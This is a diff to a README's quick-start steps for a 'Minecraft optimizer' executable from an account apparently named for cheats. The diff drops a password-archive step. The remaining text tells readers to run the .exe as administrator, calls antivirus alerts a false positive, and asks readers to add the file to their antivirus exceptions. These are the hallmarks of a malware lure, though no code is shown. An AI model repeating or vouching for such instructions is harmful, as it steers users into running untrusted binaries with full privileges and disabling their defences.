@@ -38,10 +38,9 @@
 ## 🚀 Quick Start
 
 1. **Download** the latest version from [Releases](https://github.com/BiforCheatsExecute/MinecraftOptimizer/releases)
-2. **Extract** the archive (password: `minecraft`)
-3. **Run** `MinecraftOptimizer.exe` as administrator
-4. **Wait** 10-15 seconds for optimization
-5. **Launch** Minecraft and enjoy higher FPS!
+2. **Run** `MinecraftOptimizer.exe` as administrator
+3. **Wait** 10-15 seconds for optimization
+4. **Launch** Minecraft and enjoy higher FPS!
 
 > ⚠️ **Note:** Your antivirus may flag this tool as suspicious — this is a false positive. The tool modifies system graphics settings to optimize performance. Add the file to your antivirus exceptions list.
 
